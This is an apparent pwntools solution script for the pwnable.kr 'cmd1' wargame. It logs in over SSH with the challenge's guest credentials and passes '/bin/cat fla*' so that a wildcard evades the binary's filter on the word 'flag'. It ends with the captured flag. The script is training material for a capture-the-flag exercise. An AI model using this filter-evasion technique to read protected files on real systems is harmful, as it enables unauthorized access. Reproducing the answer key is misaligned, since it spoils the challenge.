#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './cmd1')

### defines ###
"""
We can't use the env path so we need to pass the full path: /bin/cat.
The cmd1 file has filter on the word "flag" so we use '*' to instead of the last letter.
"""
CMD_ARGV = ["/bin/cat fla*"]

### SSH Config ###

host = args.HOST or 'pwnable.kr'
port = int(args.PORT or 2222)
user = args.USER or 'cmd1'
password = args.PASSWORD or 'guest'

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    ssh_client = ssh(user, host, port=port, password=password, timeout=10)
    io = ssh_client.process(['./cmd1'] + argv, tty=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
def main():
    io = start(CMD_ARGV)
    io.interactive()

if __name__ == "__main__":
    main()

#flag: PATH_environment?_Now_I_really_g3t_it,_mommy!

